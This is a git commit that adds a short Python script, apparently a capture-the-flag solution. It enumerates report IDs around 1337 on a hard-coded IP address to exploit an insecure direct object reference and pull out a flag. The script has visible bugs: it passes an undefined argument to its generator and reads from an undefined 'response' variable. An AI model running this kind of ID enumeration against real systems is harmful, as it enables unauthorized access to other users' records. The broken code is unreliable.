aae6a4f7b06a98203fb46e0970a0eab02d08f901
hue <hweng@acme-nyc.com>
2025-07-04 21:18:49 +0000

    Create extract_field_report.py

---
+++ extract_field_report.py
@@ -0,0 +1,62 @@
+"""
+
+    2025 DoD Cyber Sentinel Challenge: Field Report Mayhem 
+    ======================================================
+
+    The field report has the number 1337.  Leet (or "1337"),
+    also known as eleet, leetspeak, or simply hacker speech.
+    Create a generator to find field report. 
+
+    1337:
+    
+        https://en.wikipedia.org/wiki/Leet
+
+    Insecure direct object references (IDOR):
+    
+        https://en.wikipedia.org/wiki/Insecure_direct_object_reference
+        https://portswigger.net/web-security/access-control/idor
+    
+"""
+
+import requests
+import time
+import re
+
+def altgen(n, t):
+    """
+    generator for aternating numbers: [1234, 1233, 1235, 1233, 1236 ...]
+    
+    """
+    a=0
+    while a < t:
+        if a == 0:
+            yield n
+        else:
+            yield n + a
+            u = n - a
+            if u > 999:
+                yield u
+        a += 1
+
+w=4
+ip="35.245.106.190"
+
+for n in altgen(p):
+    url=f'http://{ip}/reports.php?id={n}&code=UV12WX/'
+    try:
+        res = requests.get(url, timeout=w)
+    except requests.RequestException:
+        print(f'Not found: {n}')
+        time.sleep(w)
+        continue
+    if res.status_code == 200:
+        c = response.text
+        print(f"\n=== found: {n} ===")
+        print(c)
+        match = re.search(r'C1\{.*?\}', c)
+        flag = match.group(0) if match else None
+        if flag:
+            print(f"\n=== flag found at {n}: {flag} ===")
+            break
+        time.sleep(w)
+        
